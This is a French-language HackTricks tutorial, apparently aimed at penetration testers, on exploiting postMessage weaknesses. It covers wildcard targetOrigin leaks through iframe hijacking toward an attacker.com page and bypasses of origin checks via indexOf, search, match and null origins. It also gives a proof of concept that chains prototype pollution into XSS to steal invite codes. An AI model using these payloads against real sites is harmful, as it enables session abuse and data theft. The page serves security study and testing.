# Vuln√©rabilit√©s PostMessage

## Vuln√©rabilit√©s PostMessage

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Envoyer **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut √™tre un '\*' ou une URL comme _https://company.com._\
Dans le **deuxi√®me sc√©nario**, le **message ne peut √™tre envoy√© qu'√† ce domaine** (m√™me si l'origine de l'objet window est diff√©rente).\
Si le **joker** est utilis√©, **les messages pourraient √™tre envoy√©s √† n'importe quel domaine**, et seront envoy√©s √† l'origine de l'objet Window.

### Attaquer un iframe & joker dans **targetOrigin**

Comme expliqu√© dans [**ce rapport**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si vous trouvez une page qui peut √™tre **ifram√©e** (pas de protection `X-Frame-Header`) et qui **envoie un message sensible** via **postMessage** en utilisant un **joker** (\*), vous pouvez **modifier** l'**origine** de l'**iframe** et **fuir** le **message sensible** vers un domaine que vous contr√¥lez.\
Notez que si la page peut √™tre ifram√©e mais que le **targetOrigin** est **d√©fini sur une URL et non sur un joker**, cette **astuce ne fonctionnera pas**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Exploitation de addEventListener

**`addEventListener`** est la fonction utilis√©e par JS pour d√©clarer la fonction qui **attend des `postMessages`**.\
Un code similaire au suivant sera utilis√© :
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Notez dans ce cas comment la **premi√®re chose** que fait le code est de **v√©rifier l'origine**. C'est extr√™mement **important**, surtout si la page doit effectuer des actions **sensibles** avec les informations re√ßues (comme changer un mot de passe). **Si elle ne v√©rifie pas l'origine, les attaquants peuvent amener les victimes √† envoyer des donn√©es arbitraires √† ces points de terminaison** et changer les mots de passe des victimes (dans cet exemple).

### √ânum√©ration

Pour **trouver des √©couteurs d'√©v√©nements** sur la page actuelle, vous pouvez :

* **Chercher** dans le code JS `window.addEventListener` et `$(window).on` (_version JQuery_)
* **Ex√©cuter** dans la console des outils de d√©veloppement : `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Aller √†** _√âl√©ments --> √âcouteurs d'√©v√©nements_ dans les outils de d√©veloppement du navigateur

![](<../../.gitbook/assets/image (617).png>)

* Utiliser une **extension de navigateur** comme [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ces extensions de navigateur vont **intercepter tous les messages** et vous les montrer.

### Contournements de la v√©rification d'origine

* **`event.isTrusted`** est vrai lorsque l'√©v√©nement a √©t√© g√©n√©r√© par une action de l'utilisateur. Pas vraiment contournable si correctement mis en place, mais il vaut la peine d'√™tre mentionn√©.
* Si **`indexOf()`** est utilis√© pour **v√©rifier** l'**origine** de l'√©v√©nement PostMessage, rappelez-vous qu'il peut √™tre facilement contourn√© comme dans l'exemple suivant :
```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* Si **`search()`** est utilis√© pour **valider** l'**origine**, cela pourrait √™tre non s√©curis√©. Selon la documentation de `String.prototype.search()`, la m√©thode **prend un objet d'expression r√©guli√®re** au lieu d'une cha√Æne de caract√®res. Si autre chose qu'une regexp est pass√©e, cela sera implicitement converti en regex.\
Dans une expression r√©guli√®re, **un point (.) est trait√© comme un joker**. Un attaquant peut en tirer avantage et **utiliser** un **domaine sp√©cial** au lieu de l'officiel pour contourner la validation, comme dans :
```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Tout comme dans l'exemple pr√©c√©dent, **`match()`** v√©rifie √©galement une **regex**, donc si la regex est mal form√©e, elle pourrait √™tre **contournable**.
* Si la fonction **`escapeHtml`** est utilis√©e, la fonction ne cr√©e pas un objet √©chapp√© `new`, √† la place elle **√©crase les propri√©t√©s** de l'objet existant. Cela signifie que si nous sommes capables de cr√©er un objet avec une propri√©t√© contr√¥l√©e qui ne r√©pond pas √† `hasOwnProperty`, elle ne sera pas √©chapp√©e.
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
L'objet `File` est parfait pour cette exploitation car il poss√®de une propri√©t√© `name` en lecture seule qui est utilis√©e par notre mod√®le et contournera la fonction `escapeHtml`.

### Contournement de e.origin == window.origin

Lorsqu'une page est int√©gr√©e dans une **iframe sandbox√©e** via `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`, l'**origin** de cette **iframe** sera **`null`**.

Lorsque la **valeur sandbox `allow-popups` est d√©finie**, alors la **popup ouverte** h√©ritera de tous les **attributs sandbox√©s** √† moins que `allow-popups-to-escape-sandbox` ne soit d√©fini.\
Ainsi, ouvrir une **popup** depuis une **origin null** rendra **`window.origin`** √† l'int√©rieur de la popup √©galement **`null`**.

Par cons√©quent, si vous ouvrez une **iframe sandbox√©e** autorisant les popups, puis vous **ouvrez une popup** depuis l'int√©rieur de l'iframe, et **envoyez un postMessage** de l'iframe **√† la popup**, les deux origins sont null donc : **`e.origin == window.origin == null`**

Pour plus d'informations **lisez** :

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contournement de e.source

Il est possible de v√©rifier si le message provient de la m√™me fen√™tre o√π le script est en √©coute (particuli√®rement int√©ressant pour les **Scripts de Contenu des extensions de navigateur** pour v√©rifier si le message a √©t√© envoy√© depuis la m√™me page) :
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Vous pouvez forcer **`e.source`** d'un message √† √™tre null en cr√©ant un **iframe** qui **envoie** le **postMessage** et est **imm√©diatement supprim√©**.

Pour plus d'informations **lisez :**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Contournement du X-Frame-Header

Pour r√©aliser ces attaques id√©alement, vous devriez pouvoir **mettre la page web victime** dans un `iframe`. Mais certains en-t√™tes comme `X-Frame-Header` peuvent **emp√™cher** ce **comportement**.\
Dans ces sc√©narios, vous pouvez toujours utiliser une attaque moins discr√®te. Vous pouvez ouvrir un nouvel onglet vers l'application web vuln√©rable et communiquer avec elle :
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Vol de message envoy√© √† l'enfant en bloquant la page principale

Dans la page suivante, vous pouvez voir comment vous pourriez voler des **donn√©es postmessage sensibles** envoy√©es √† un **iframe enfant** en **bloquant** la page **principale** avant d'envoyer les donn√©es et en abusant d'un **XSS dans l'enfant** pour **fuir les donn√©es** avant qu'elles soient re√ßues :

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Vol de message en modifiant l'emplacement de l'iframe

Si vous pouvez int√©grer une page web sans en-t√™te X-Frame dans un iframe qui contient un autre iframe, vous pouvez **changer l'emplacement de cet iframe enfant**, donc si il re√ßoit un **postmessage** envoy√© en utilisant un **joker**, un attaquant pourrait **changer** l'**origine** de cet iframe vers une page **contr√¥l√©e** par lui et **voler** le message :

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage vers Pollution de Prototype et/ou XSS

Dans des sc√©narios o√π les donn√©es envoy√©es via `postMessage` sont ex√©cut√©es par JS, vous pouvez int√©grer la **page** dans un iframe et **exploiter** la **pollution de prototype/XSS** en envoyant l'exploit via `postMessage`.

Un couple d'**explications tr√®s bien faites de XSS via `postMessage`** peuvent √™tre trouv√©es sur [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemple d'un exploit pour abuser de **Pollution de Prototype puis XSS** √† travers un `postMessage` vers un `iframe` :
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Pour **plus d'informations** :

* Lien vers la page sur la [**pollution de prototype**](../deserialization/nodejs-proto-prototype-pollution/)
* Lien vers la page sur le [**XSS**](../xss-cross-site-scripting/)
* Lien vers la page sur [**la pollution de prototype c√¥t√© client vers XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## R√©f√©rences

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pour pratiquer : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
